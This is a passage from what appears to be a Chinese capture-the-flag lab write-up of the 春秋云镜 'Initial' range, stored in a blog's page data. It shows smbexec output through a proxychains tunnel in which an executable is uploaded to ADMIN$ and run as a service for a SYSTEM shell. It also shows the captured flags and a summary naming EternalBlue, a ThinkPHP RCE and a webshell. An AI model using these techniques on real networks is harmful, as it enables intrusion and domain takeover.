OK\n[*] Requesting shares on 172.22.1.2.....\n[*] Found writable share ADMIN$\n[*] Uploading file EweiadZn.exe\n[*] Opening SVCManager on 172.22.1.2.....\n[*] Creating service VYGQ on 172.22.1.2.....\n[*] Starting service VYGQ.....\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445 [!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\n ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand <span class=\"hljs-keyword\">then</span> execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [�汾 10.0.14393]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand <span class=\"hljs-keyword\">then</span> execute smbexec.py again with -codec and the corresponding codec\n(c) 2016 Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32> \nC:\\Windows\\system32> <span class=\"hljs-built_in\">type</span> ..\\..\\Users\\Administrator\\flag\\flag03.txt\n           ___   ___                                                             \n \\\\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) ) \n  \\  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //        \n  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____   \n / /\\\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /   \n/ /  \\\\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /    \n\nflag03: e8f88d0d43d6}\n\nUnbelievable! ! You found the last flag, which means you have full control over the entire domain network.\n</code></pre>\n<h2>总的flag</h2>\n<pre><code class=\"hljs language-bash\">flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}\n</code></pre>\n<h2>总结</h2>\n<p>靶机不算难，但是环境不稳定，永恒之蓝成功率太低了，永恒之蓝卡了得有一小时</p>\n<p>还有就是ew搭建隧道很容易就断开了，并提示<code>Segmentation faul</code>，下次试试别的</p>","title":"春秋云镜 - Initial","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","综合靶场"],"categories":"靶机","description":"Initial\n\n https://yunjing.ichunqiu.com/major/detail/1077?type=1\n \n\n前期踩点\n\n直接使用 `fscan` 扫描 （靶机IP：`39.99.128.239`）\n\n\n\nThinkphp 5.0.23 RCE\n\n直接扫出来了`Thinkphp`的`rce`漏洞，使用工具一把梭哈\n\n\n\n直接`GETSHELL` ，在网站目录下生成一个一句话..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}